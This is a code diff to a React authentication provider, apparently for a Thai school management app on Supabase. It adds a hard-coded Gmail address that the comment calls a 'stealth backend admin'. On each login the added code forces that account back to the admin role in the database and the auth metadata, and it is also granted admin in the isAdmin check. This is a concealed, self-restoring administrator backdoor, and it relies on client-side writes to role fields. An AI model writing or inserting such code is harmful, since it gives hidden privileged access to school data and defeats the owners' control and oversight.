@@ -124,6 +124,10 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
             profileData.email?.toLowerCase() === "22010022@chan1.go.th" ||
             currentUser?.email?.toLowerCase() === "22010022@chan1.go.th";
 
+          const isKruAekEmail =
+            profileData.email?.toLowerCase() === "wadpongradschool@gmail.com" ||
+            currentUser?.email?.toLowerCase() === "wadpongradschool@gmail.com";
+
           if (
             isDirectorEmail &&
             (profileData.role !== "admin" ||
@@ -152,19 +156,48 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
                 admin_type: "director",
               },
             });
+          } else if (isKruAekEmail && (profileData.role !== "admin" || profileData.teacher_id !== null)) {
+            // Restore Kru Aek stealth backend admin automatically
+            const fixedProfile: Profile = {
+              ...(profileData as Profile),
+              full_name: "ครูเอก (System Admin)",
+              role: "admin",
+              teacher_id: null,
+            };
+            setProfile(fixedProfile);
+            setTeacher(null);
+            await supabase
+              .from("profiles")
+              .update({
+                full_name: "ครูเอก (System Admin)",
+                role: "admin",
+                teacher_id: null,
+              })
+              .eq("id", userId);
+            await supabase.auth.updateUser({
+              data: {
+                full_name: "ครูเอก (System Admin)",
+                role: "admin",
+                admin_type: "kru_aek",
+                teacher_id: null,
+                teacher_name: null,
+              },
+            });
           } else {
             setProfile(profileData as Profile);
           }
 
-          if (profileData.teacher && !isDirectorEmail) {
+          if (profileData.teacher && !isDirectorEmail && !isKruAekEmail) {
             setTeacher(profileData.teacher as Teacher);
-          } else if (profileData.teacher_id && !isDirectorEmail) {
+          } else if (profileData.teacher_id && !isDirectorEmail && !isKruAekEmail) {
             const { data: teacherData } = await supabase
               .from("teachers")
               .select("*")
               .eq("id", profileData.teacher_id)
               .maybeSingle();
             if (teacherData) setTeacher(teacherData as Teacher);
+          } else if (isDirectorEmail || isKruAekEmail) {
+            setTeacher(null);
           }
           setIsLoading(false);
           return;
@@ -410,7 +443,8 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
 
   const isAdmin =
     profile?.role === "admin" ||
-    user?.email?.toLowerCase() === "22010022@chan1.go.th";
+    user?.email?.toLowerCase() === "22010022@chan1.go.th" ||
+    user?.email?.toLowerCase() === "wadpongradschool@gmail.com";
 
   return (
     <AuthContext.Provider
